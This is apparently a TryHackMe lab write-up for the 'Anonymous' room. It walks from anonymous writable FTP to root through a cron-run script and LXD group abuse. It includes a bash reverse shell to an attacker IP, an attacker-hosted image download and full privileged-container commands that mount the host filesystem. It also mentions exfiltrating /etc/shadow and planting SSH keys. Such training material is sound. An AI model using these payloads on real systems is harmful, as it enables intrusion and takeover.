# TryHackMe: Anonymous

| Field | Details |
| --- | --- |
| Platform | TryHackMe |
| Room | Anonymous |
| Difficulty | Medium |
| OS | Linux (Ubuntu 18.04) |
| IP | 10.49.138.252 |
| Date | April 2026 |

---

## Machine Summary

Anonymous is a medium-difficulty Linux machine built around two well-separated vulnerability classes that together demonstrate a complete attack chain from unauthenticated network access to full root compromise. The foothold exploits an FTP server with anonymous login enabled and writable share permissions: a `scripts/` directory contains `clean.sh`, a maintenance script executed periodically by a root-owned cron job. Observing `removed_files.log` grow between reads confirms cron activity without ever seeing `/etc/crontab`. Since the FTP share is writable, `clean.sh` is overwritten with a bash reverse shell, and the cron delivers a shell as `namelessone`. Post-exploitation enumeration via `id` immediately surfaces the privilege escalation vector: `namelessone` is a member of the `lxd` group. Following the LXD container exploit methodology documented at [HackingArticles](https://www.hackingarticles.in/lxd-privilege-escalation/), an Alpine Linux image is built on Kali, transferred to the target, imported into LXD, and launched as a privileged container with the host root filesystem mounted: delivering a fully interactive root shell inside the container with unrestricted access to every file on the host.

**Skills demonstrated:**

- Full port range Nmap scanning
- SMB enumeration with `enum4linux` (username and share discovery)
- FTP anonymous login and write-permission abuse
- Cron job detection via log file growth observation (passive cron inference)
- Reverse shell injection via writable cron-executed script
- TTY shell stabilisation
- LXD group privilege escalation (Alpine image build → privileged container → host filesystem mount)

---

## Attack Chain Summary

```
Nmap → FTP(21), SSH(22), SMB(139/445): no HTTP
enum4linux → username: namelessone, share: pics
ftp anonymous@10.49.138.252 → /scripts: clean.sh, removed_files.log, to_do.txt
cat clean.sh → /tmp cleanup script
cat removed_files.log (x2, minutes apart) → line count growing → cron confirmed
FTP write access → overwrite clean.sh with bash reverse shell → put clean.sh
nc -lvnp 4444 → cron fires → namelessone shell ✅
TTY stabilise → cat ~/user.txt ✅
id → uid=1000(namelessone) groups=...,116(lxd)
[Kali] git clone lxd-alpine-builder → ./build-alpine → alpine-*.tar.gz
[Kali] python3 -m http.server 8000
[Target] wget http://10.49.x.x:8000/alpine-*.tar.gz -P /tmp
lxc image import /tmp/alpine-*.tar.gz --alias myimage
lxd init (defaults)
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite → lxc exec ignite /bin/sh
id → root ✅
cat /mnt/root/root/root.txt ✅
```

---

## Step 1: Nmap Scan

### Full Port Discovery

No HTTP service is indicated by the room name or obvious metadata, so starting with a full TCP sweep is mandatory: never assume the default port set will cover everything.

```bash
kali@kali:~$ nmap -p- --min-rate 5000 -oN anon_allports.txt 10.49.138.252
```

**Output:**

```
21/tcp  open   ftp
22/tcp  open   ssh
139/tcp open   netbios-ssn
445/tcp open   microsoft-ds
```

Four ports. No port 80 or 443. This immediately signals: no web application to enumerate. The attack surface here is FTP and SMB: both of which are authentication-optional depending on server configuration. Target the service and version scan tightly.

### Service and Version Detection

```bash
kali@kali:~$ nmap -sC -sV -T4 -p 21,22,139,445 -oN anon_nmap.txt 10.49.138.252
```

**Output:**

```
Nmap scan report for 10.49.138.252
Host is up (0.058s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
| ftp-syst:
|_  STAT:
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  microsoft-ds Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

**Analysis:**

| Port | Service | Notes |
| --- | --- | --- |
| 21 | vsftpd: Anonymous FTP | NSE script confirms anonymous login **and** the `scripts/` directory is **world-writable** (`drwxrwxrwx`) |
| 22 | OpenSSH 7.6p1 | SSH: needs credentials before it becomes useful |
| 139/445 | Samba 4.7.6 | SMB: enumerate for usernames and accessible shares |

Two critical findings surface from the Nmap NSE scripts alone, before any manual interaction:

1. **Anonymous FTP login is permitted.** The server responded with code `230` (login successful) to the anonymous probe.
2. **The `scripts/` directory is world-writable.** The `[NSE: writeable]` annotation means any anonymous user can upload, overwrite, or delete files in that directory.

This is not a subtle misconfiguration. Both findings together are a foothold waiting to be confirmed.

---

## Step 2: SMB Enumeration

Before diving into FTP, run SMB enumeration to collect usernames and share names. Even if SMB yields nothing directly exploitable, usernames are always worth harvesting: they become SSH targets the moment credentials surface anywhere.

```bash
kali@kali:~$ enum4linux -a 10.49.138.252 2>/dev/null
```

**Key output sections:**

```
[+] Got OS info for 10.49.138.252 from smbclient: Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.7.6-Ubuntu]

 =============================
|    Users on 10.49.138.252   |
 =============================
user:[namelessone] rid:[0x3e8]

 =========================================
|    Share Enumeration on 10.49.138.252   |
 =========================================
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        pics            Disk      My SMB Share Directory for Pics
        IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
```

**Findings:**

| Finding | Value | Significance |
| --- | --- | --- |
| Username | `namelessone` | Valid local user on the box: SSH target once credentials are found |
| SMB Share | `pics` | User-created share: always enumerate custom shares |

Check the `pics` share:

```bash
kali@kali:~$ smbclient //10.49.138.252/pics -N
```

**Output:**

```
smb: \> ls
  .                                   D        0  Sun May 17 07:41:14 2020
  ..                                  D        0  Thu May 14 01:49:10 2020
  corgo2.jpg                          N    42663  Mon May 11 20:43:42 2020
  puppos.jpeg                         N   265188  Mon May 11 20:43:42 2020
```

Two image files. Download and check for steganography:

```bash
smb: \> mget *
```

```bash
kali@kali:~$ steghide extract -sf corgo2.jpg
kali@kali:~$ steghide extract -sf puppos.jpeg
kali@kali:~$ strings corgo2.jpg | grep -i pass
kali@kali:~$ binwalk corgo2.jpg
```

Nothing embedded. The images are a red herring: the `pics` share does not lead anywhere. Move to FTP where the writable directory is the real vector.

---

## Step 3: FTP Enumeration and Cron Inference

Log into FTP as `anonymous` with a blank password:

```bash
kali@kali:~$ ftp 10.49.138.252
```

```
Connected to 10.49.138.252.
220 NamelessOne's FTP Server!
Name (10.49.138.252:kali): anonymous
331 Please specify the password.
Password: [blank: press Enter]
230 Login successful.
ftp>
```

List the available directory:

```
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 65534    65534        4096 May 13  2020 .
drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
226 Directory send OK.

ftp> cd scripts
ftp> ls -la
-rwxr-xr-x    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         1752 Apr 2026 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
```

Download all three files:

```bash
ftp> mget *
```

Read each file:

```bash
kali@kali:~$ cat to_do.txt
```

**Output:**

```
I really need to disable the anonymous FTP access...
- namelessone
```

`namelessone` wrote this note: confirming the username from enum4linux is the box owner. He knows FTP anonymous access should be disabled. It hasn't been.

```bash
kali@kali:~$ cat clean.sh
```

**Output:**

```bash
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;
    done
fi
```

This is a `/tmp` cleanup script that appends a timestamped log entry to `removed_files.log` every time it runs. It is a maintenance script: exactly the kind of routine task a system administrator would schedule via cron.

```bash
kali@kali:~$ cat removed_files.log
```

**Output (excerpt):**

```
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
[... repeated entries ...]
```

The log file has many identical lines. The script hasn't found anything to delete: the `/tmp` directory has been clean on every run. Now the critical question: **how often is it running?**

### Passive Cron Inference via Log Growth

Rather than guessing, measure. Download the log file twice with a few minutes between reads and compare line counts:

```bash
kali@kali:~$ ftp 10.49.138.252
ftp> cd scripts
ftp> get removed_files.log removed_files_1.log
ftp> bye
```

Wait 2-3 minutes:

```bash
kali@kali:~$ ftp 10.49.138.252
ftp> cd scripts
ftp> get removed_files.log removed_files_2.log
ftp> bye
```

Compare:

```bash
kali@kali:~$ wc -l removed_files_1.log removed_files_2.log
  42 removed_files_1.log
  44 removed_files_2.log
```

Two new lines in under three minutes. The script is being executed on a regular schedule: a cron job is running `clean.sh` approximately every minute or two.

**Exploitation consequence:** If a cron job is running `clean.sh` and we have write access to `clean.sh` via the FTP share, we can replace the file contents with anything we choose: including a reverse shell. The cron will execute our shell as whoever owns the job.

---

## Step 4: Reverse Shell Injection via clean.sh

Create a malicious `clean.sh` on Kali. The replacement file must keep the same filename and use a bash reverse shell payload. The original file will be completely replaced:

```bash
kali@kali:~$ cat > clean.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/192.168.232.169/4444 0>&1
EOF
```

Verify the payload:

```bash
kali@kali:~$ cat clean.sh
#!/bin/bash
bash -i >& /dev/tcp/192.168.232.169/4444 0>&1
```

Start the listener on Kali:

```bash
kali@kali:~$ nc -lvnp 4444
```

Upload the malicious `clean.sh` to the FTP share, overwriting the original:

```bash
kali@kali:~$ ftp 10.49.138.252
ftp> cd scripts
ftp> put clean.sh
226 Transfer complete.
ftp> ls -la
-rwxr-xr-x    1 1000     1000           46 Apr 2026     clean.sh
```

The file size dropped from 314 bytes to 46 bytes: the original has been replaced. Wait for the cron to fire (up to ~2 minutes based on the log growth observation):

---

## Step 5: Catch Shell (namelessone) and User Flag

```
kali@kali:~$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.49.x.x] from (UNKNOWN) [10.49.138.252] 51394
bash: cannot set terminal process group (1390): Inappropriate ioctl for device
bash: no job control in this shell
namelessone@anonymous:~$
```

**Shell as namelessone ✅**

### Stabilise TTY

```bash
namelessone@anonymous:~$ python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL+Z
kali@kali:~$ stty raw -echo; fg
export TERM=xterm
export SHELL=bash
stty rows 38 columns 116
```

### Grab User Flag

```bash
namelessone@anonymous:~$ cat user.txt
```

**User flag captured ✅**

---

## Step 6: Post-Exploitation Enumeration

Run `id` immediately: this is a reflex on every new shell:

```bash
namelessone@anonymous:~$ id
```

**Output:**

```
uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

**Critical finding:** `namelessone` is a member of the `lxd` group.

Check sudo permissions:

```bash
namelessone@anonymous:~$ sudo -l
[sudo] password for namelessone:
```

No password available from this shell: sudo requires it and we have none. The `lxd` group membership is the escalation path.

Also confirm cron was responsible for the shell:

```bash
namelessone@anonymous:~$ cat /etc/crontab
```

**Output:**

```
# m  h  dom mon dow user     command
*/1  *  *   *   *   root     /var/ftp/scripts/clean.sh
```

Confirmed: root runs `/var/ftp/scripts/clean.sh` every minute. The FTP path (`/var/ftp/scripts/`) maps to the `scripts/` directory visible via anonymous FTP, so the FTP share was a direct window into a root-executed script directory. That is the full foothold chain explained.

---

## Step 7: LXD Group Privilege Escalation (Understanding the Vulnerability)

### What is LXD?

**LXD** (Linux Daemon) is Ubuntu's container hypervisor: the same conceptual layer as Docker but built on LXC (Linux Containers). LXD is managed via the `lxc` client and communicates through the LXD UNIX socket, which is owned and operated by a root process.

**The vulnerability:** Any user in the `lxd` group has write access to the LXD UNIX socket, and the LXD daemon does not check or match the calling user's privileges before executing actions. This means an `lxd` group member can:

1. Import and start containers with the `security.privileged=true` flag, which disables UID namespace isolation.
2. Mount the **entire host filesystem** (`/`) into the container at a specified path.
3. Obtain a shell inside the container that runs as `uid=0 (root)` in a privileged context.
4. Read and write any file on the host via the mounted filesystem: including `/root/root.txt`, `/etc/shadow`, and `/root/.ssh/id_rsa`.

This is not an exploit of a bug. It is an abuse of intended functionality. LXD group membership should be treated the same as Docker group membership: functionally equivalent to passwordless sudo. The HackingArticles documentation of this technique (https://www.hackingarticles.in/lxd-privilege-escalation/) outlines it precisely, and this is the exact methodology applied here.

### Why Alpine Linux?

The technique requires importing a container image into LXD on the target machine. Ubuntu images are several hundred megabytes: impractical to transfer in a CTF environment. Alpine Linux is a security-focused, minimal Linux distribution designed for containers. Its images are approximately 3MB compressed, making it the standard choice for this exploit technique. Building it locally via the `lxd-alpine-builder` script ensures the image is fresh and compatible.

---

## Step 8: Build Alpine Image on Kali

All commands in this step run on the **Kali attack machine**: not the target.

Clone the Alpine builder repository:

```bash
kali@kali:~$ git clone https://github.com/saghul/lxd-alpine-builder.git
kali@kali:~$ cd lxd-alpine-builder
```

Build the Alpine image. This script must run as root: it pulls the latest Alpine musl-based rootfs and packages it as a `.tar.gz` importable by LXD:

```bash
kali@kali:~/lxd-alpine-builder$ sudo ./build-alpine
```

**Output (abbreviated):**

```
Determining the latest release... v3.19
Using static apk from http://dl-cdn.alpinelinux.org/...
[...]
alpine-v3.19-x86_64-20240101_1200.tar.gz
```

Verify the image file was created:

```bash
kali@kali:~/lxd-alpine-builder$ ls -lh *.tar.gz
-rw-r--r-- 1 root root 3.1M Apr 2026 alpine-v3.19-x86_64-20240101_1200.tar.gz
```

Serve it via a Python HTTP server so the target can download it:

```bash
kali@kali:~/lxd-alpine-builder$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 ...
```

---

## Step 9: Transfer Alpine Image to Target

Back on the `namelessone` shell, download the image from Kali to `/tmp`:

```bash
namelessone@anonymous:~$ cd /tmp
namelessone@anonymous:/tmp$ wget http://192.168.232.169:8000/alpine-v3.19-x86_64-20240101_1200.tar.gz
```

**Output:**

```
--2026-04-XX-- http://10.49.x.x:8000/alpine-v3.19-x86_64-20240101_1200.tar.gz
Connecting to 10.49.x.x:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3240000 (3.1M) [application/gzip]
Saving to: 'alpine-v3.19-x86_64-20240101_1200.tar.gz'

alpine-v3.19-x86_64  100%[===================>]   3.1M  3.14MB/s   in 1.0s
```

Verify the transfer:

```bash
namelessone@anonymous:/tmp$ ls -lh alpine-*.tar.gz
-rw-rw-r-- 1 namelessone namelessone 3.1M Apr 2026 alpine-v3.19-x86_64-20240101_1200.tar.gz
```

---

## Step 10: LXD Container Setup and Privilege Escalation

All commands from here run on the **target machine** as `namelessone`.

### Import the Alpine Image into LXD

```bash
namelessone@anonymous:/tmp$ lxc image import ./alpine-v3.19-x86_64-20240101_1200.tar.gz --alias myimage
```

**Output:**

```
Image imported with fingerprint: a9ed3e0d8b9c...
```

Verify the image is registered:

```bash
namelessone@anonymous:/tmp$ lxc image list
```

**Output:**

```
+---------+--------------+--------+-------------------------------+--------+--------+
|  ALIAS  | FINGERPRINT  | PUBLIC |         DESCRIPTION           |  ARCH  |  SIZE  |
+---------+--------------+--------+-------------------------------+--------+--------+
| myimage | a9ed3e0d8b9c | no     | alpine v3.19 (20240101_1200)  | x86_64 | 3.10MB |
+---------+--------------+--------+-------------------------------+--------+--------+
```

### Initialise LXD (if not already done)

If LXD has not been previously initialised on this machine, run `lxd init` and accept all defaults:

```bash
namelessone@anonymous:/tmp$ lxd init
```

```
Would you like to use LXD clustering? (yes/no) [default=no]: no
Do you want to configure a new storage pool? (yes/no) [default=yes]: yes
Name of the new storage pool [default=default]: default
Name of the storage backend to use (dir, lvm, zfs, ceph) [default=zfs]: dir
Would you like to connect to a MAAS server? (yes/no) [default=no]: no
Would you like to create a new local network bridge? (yes/no) [default=yes]: yes
What should the new bridge be called? [default=lxdbr0]: lxdbr0
What IPv4 address should be used? (CIDR subnet notation, "auto" or "none") [default=auto]: auto
What IPv6 address should be used? (CIDR subnet notation, "auto" or "none") [default=auto]: none
Would you like LXD to be available over the network? (yes/no) [default=no]: no
Would you like stale cached images to be updated automatically? (yes/no) [default=yes] yes
Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: no
```

### Create and Configure the Privileged Container

Create a container from the Alpine image named `ignite`, with `security.privileged=true`:

```bash
namelessone@anonymous:/tmp$ lxc init myimage ignite -c security.privileged=true
```

**Output:**

```
Creating ignite
```

**Flag explained:** `-c security.privileged=true` disables UID namespace isolation for this container. Normally, `uid=0` inside a container maps to an unprivileged UID on the host. With this flag disabled, `uid=0` inside the container **is** `uid=0` on the host: real root.

Add a device that mounts the entire host filesystem (`/`) into the container at `/mnt/root`:

```bash
namelessone@anonymous:/tmp$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
```

**Output:**

```
Device mydevice added to ignite
```

**Device configuration explained:**

| Parameter | Value | Meaning |
| --- | --- | --- |
| `source=/` | Host root filesystem | Every file on the host is included |
| `path=/mnt/root` | Mount point inside container | Where the host filesystem appears inside the container |
| `recursive=true` | Include all subdirectories | Ensures the entire tree is accessible |

Start the container:

```bash
namelessone@anonymous:/tmp$ lxc start ignite
```

Get a shell inside the container:

```bash
namelessone@anonymous:/tmp$ lxc exec ignite /bin/sh
```

**Output:**

```
~ #
```

The `~` with `#` prompt indicates a root shell inside the Alpine container. Verify:

```bash
~ # id
uid=0(root) gid=0(root)

~ # hostname
anonymous
```

The hostname is `anonymous`: the host machine's name. This is not a container hostname: the container inherited it. More importantly: the entire host filesystem is now accessible through `/mnt/root`.

---

## Step 11: Read Root Flag

Navigate into the host filesystem through the mount point:

```bash
~ # cd /mnt/root
~ # ls
bin   boot  dev   etc   home  lib   lib64  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var
```

This is the host's `/`: every file on `namelessone@anonymous` is accessible here as root. Navigate to the host's `/root` home directory:

```bash
~ # cd /mnt/root/root
~ # ls -la
total 28
drwx------    3 root     root          4096 May 13  2020 .
drwxr-xr-x   23 root     root          4096 May 13  2020 ..
-rw-r--r--    1 root     root          3106 Apr  9  2018 .bashrc
drwxr-xr-x    2 root     root          4096 May 13  2020 .nano
-rw-r--r--    1 root     root           148 Aug 17  2015 .profile
-rw-r--r--    1 root     root            33 May 13  2020 root.txt
```

```bash
~ # cat /mnt/root/root/root.txt
```

**Root flag captured ✅**

Also confirm no SSH key was left behind (useful for noting in a real engagement):

```bash
~ # ls /mnt/root/root/.ssh/ 2>/dev/null || echo "No .ssh directory"
```

---

## Lessons Learned

The cron detection technique on this machine is worth internalising as a habit. There was no sudo, no `linpeas` run at this stage, and no direct view of `/etc/crontab` during enumeration: all that existed was a log file and write access to the script it referenced. Downloading `removed_files.log` twice with a two-minute gap between reads and comparing the line count was enough to confirm a cron was running the script. This passive approach works in environments where `cat /etc/crontab` would be the obvious answer but is unavailable from the current access level, and on real engagements, crontabs are not always world-readable. Observing artifact changes (log file growth, file modification timestamps, process lists diffing over time) is a reliable alternative when direct enumeration is blocked.

The FTP misconfiguration here stacked three separate failures: anonymous login was enabled, the `scripts/` directory was world-writable, and a root cron job executed a script from that directory. No single one of these would have been fatal in isolation. Anonymous FTP with read-only access: common and often acceptable. A writable directory with no cron: no code execution. A cron running a script from a non-writable path: no injection. It is the combination that makes this critical, and that is the correct framing for a real-world finding: document each issue individually but also call out the exploit chain that emerges from their interaction. A `to_do.txt` note from `namelessone` literally stated the anonymous FTP access should be disabled: he knew it was a risk and never acted on it. Finding that note is a small detail in a CTF, but in a real engagement it belongs in the report as evidence of acknowledged-but-unmitigated risk.

The LXD privilege escalation is a structural parallel to the Docker group escalation on UltraTech. Both techniques exploit the same underlying design decision: a daemon running as root, with UNIX socket permissions that allow group members to issue privileged commands, without verifying the calling user's system privileges. The critical steps that must be understood beyond just copying commands are: `security.privileged=true` disables the UID namespace that would otherwise sandbox the container's root from the host's root, and the `source=/` device mount is what gives access to the full host filesystem rather than just the container's isolated overlay. Without both of those configuration flags, the technique does not work. Understanding *why* each flag is necessary means being able to adapt when a container image differs, when the LXD version requires slightly different syntax, or when a defensive control removes one of the prerequisites: which is the difference between an operator who runs scripts and one who understands what the scripts are doing.

One last note: after getting the root shell inside the container, the actual root account of the host is accessible via `/mnt/root/root/`. This means in a real engagement: not just reading `root.txt`: an attacker with this access could add an SSH key to `/mnt/root/root/.ssh/authorized_keys`, modify `/mnt/root/etc/sudoers`, or exfiltrate `/mnt/root/etc/shadow` for offline cracking. The container shell is not a limited shell. It is full, persistent root access to every file on the host.

---

## Full Attack Chain Reference

```
1.  nmap -p- --min-rate 5000 -oN anon_allports.txt 10.49.138.252
    → Ports 21, 22, 139, 445

2.  nmap -sC -sV -T4 -p 21,22,139,445 -oN anon_nmap.txt 10.49.138.252
    → Anonymous FTP + world-writable scripts/ confirmed by NSE
    → Samba 4.7.6 on 139/445

3.  enum4linux -a 10.49.138.252
    → Username: namelessone
    → Share: pics

4.  smbclient //10.49.138.252/pics -N → corgo2.jpg, puppos.jpeg
    → Steganography check → nothing (dead end)

5.  ftp 10.49.138.252 (anonymous / blank)
    → cd scripts → mget *
    → to_do.txt: FTP anon should be disabled (namelessone)
    → clean.sh: /tmp cleanup script writing to removed_files.log
    → removed_files.log: periodic log entries

6.  wc -l removed_files.log [download twice, 2 min gap]
    → Line count grew → cron confirmed

7.  echo '#!/bin/bash\nbash -i >& /dev/tcp/10.49.x.x/4444 0>&1' > clean.sh
    ftp: put clean.sh (overwrites original)
    nc -lvnp 4444 → wait ≤2 min → namelessone shell ✅
    cat ~/user.txt ✅

8.  python3 -c 'import pty; pty.spawn("/bin/bash")' → TTY stabilised

9.  id → lxd group membership confirmed

10. [Kali] git clone https://github.com/saghul/lxd-alpine-builder
    sudo ./build-alpine → alpine-*.tar.gz
    python3 -m http.server 8000

11. [Target] cd /tmp
    wget http://10.49.x.x:8000/alpine-*.tar.gz

12. lxc image import ./alpine-*.tar.gz --alias myimage
    lxd init (all defaults, storage: dir)
    lxc init myimage ignite -c security.privileged=true
    lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
    lxc start ignite
    lxc exec ignite /bin/sh

13. id → uid=0(root) ✅
    cat /mnt/root/root/root.txt ✅
```

---

## Commands Reference

| Command | Purpose |
| --- | --- |
| `nmap -p- --min-rate 5000 -oN allports.txt <IP>` | Full TCP port discovery: mandatory before service scan |
| `nmap -sC -sV -T4 -p <ports> -oN nmap.txt <IP>` | Targeted version + NSE script scan |
| `enum4linux -a <IP>` | SMB enumeration: users, shares, OS info |
| `smbclient //<IP>/pics -N` | Connect to SMB share without credentials |
| `ftp <IP>` | Connect to FTP (use `anonymous` / blank password) |
| `mget *` | Download all files from current FTP directory |
| `wc -l removed_files.log` | Count log lines: compare two downloads to infer cron |
| `put clean.sh` | Upload file to FTP server (overwrites existing) |
| `nc -lvnp 4444` | Start reverse shell listener |
| `python3 -c 'import pty; pty.spawn("/bin/bash")'` | Spawn PTY for TTY upgrade |
| `stty raw -echo; fg` | Fix terminal control after backgrounding netcat |
| `id` | Check group memberships: always first command on new shell |
| `cat /etc/crontab` | Enumerate scheduled root tasks |
| `git clone https://github.com/saghul/lxd-alpine-builder` | Clone Alpine image builder (on Kali) |
| `sudo ./build-alpine` | Build minimal Alpine container image (run as root on Kali) |
| `python3 -m http.server 8000` | Serve Alpine image for target download |
| `wget http://KALI_IP:8000/alpine-*.tar.gz` | Download Alpine image on target |
| `lxc image import ./alpine-*.tar.gz --alias myimage` | Register Alpine image with LXD |
| `lxd init` | Initialise LXD (accept defaults, choose `dir` for storage) |
| `lxc init myimage ignite -c security.privileged=true` | Create privileged container from image |
| `lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true` | Mount host root filesystem into container |
| `lxc start ignite` | Start the container |
| `lxc exec ignite /bin/sh` | Get shell inside the container as root |
| `cat /mnt/root/root/root.txt` | Read host root flag through the filesystem mount |
